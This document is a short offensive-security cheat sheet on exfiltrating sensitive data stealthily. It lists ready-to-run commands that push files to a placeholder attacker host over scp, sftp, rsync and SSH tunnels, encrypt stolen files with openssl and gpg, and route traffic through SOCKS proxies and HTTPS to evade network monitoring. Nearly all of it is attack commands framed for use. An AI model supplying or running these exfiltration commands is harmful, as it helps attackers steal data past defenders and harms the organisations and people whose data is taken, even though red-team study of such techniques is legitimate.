### Secure Transfers for Data Exfiltration

When exfiltrating sensitive data, encryption and stealth are critical to avoid detection and interception. Secure transfer techniques ensure confidentiality and integrity while bypassing network monitoring solutions.

### Using SCP for Encrypted Transfers

SCP (Secure Copy Protocol) is built into SSH and provides encryption for file transfers.

### Linux to Linux

```bash
scp secret.txt user@attacker_ip:/tmp/
```

#### Windows to Linux using SCP via PowerShell

```powershell
scp C:\Users\Public\secret.txt user@attacker_ip:/home/user/
```

### Using SFTP for Secure Transfers

SFTP (SSH File Transfer Protocol) encrypts both data and authentication.

#### Interactive SFTP Transfer

```bash
sftp user@attacker_ip
put secret.txt
exit
```

#### Automating SFTP with a Script

```bash
echo "put secret.txt" > sftp_commands.txt
sftp -b sftp_commands.txt user@attacker_ip
```

### Using OpenSSL to Encrypt Files Before Transfer

Encrypting files before transfer prevents exposure if intercepted.

#### Encrypting a File with AES

```bash
openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc -k SuperSecretKey
```

#### Decrypting After Transfer

```bash
openssl enc -aes-256-cbc -d -in secret.enc -out secret.txt -k SuperSecretKey
```

### Using GPG for Strong Encryption

GPG (GNU Privacy Guard) provides strong encryption with public/private keys.

#### Encrypting a File

```bash
gpg --output secret.gpg --encrypt --recipient attacker@example.com secret.txt
```

#### Decrypting After Transfer

```bash
gpg --output secret.txt --decrypt secret.gpg
```

### Using rsync Over SSH

rsync allows efficient file transfer while encrypting traffic via SSH.

```bash
rsync -avz -e ssh /path/to/data user@attacker_ip:/tmp/
```

### Using Tunneling for Secure Transfers

Tunneling traffic through an encrypted channel helps bypass network monitoring.

#### SSH Tunneling for Secure File Transfer

```bash
ssh -L 9001:victim_ip:22 user@attacker_ip
scp -P 9001 victim_user@localhost:/sensitive/data.txt /safe/location/
```

#### SOCKS5 Proxy with SSH for Secure Transfers

```bash
ssh -D 1080 user@attacker_ip
```

Configure tools like `curl` or `wget` to route traffic through this proxy.

### Using HTTPS for Stealthy Transfers

When traditional file transfer protocols are blocked, HTTPS can be used.

#### Downloading via HTTPS with PowerShell

```powershell
Invoke-WebRequest -Uri "https://secure-server.com/data" -OutFile "C:\Users\Public\data.txt"
```

#### cURL Secure File Transfer

```bash
curl -k -O https://secure-server.com/secret.txt
```

These methods ensure that data remains encrypted and protected throughout the transfer process, reducing the risk of interception.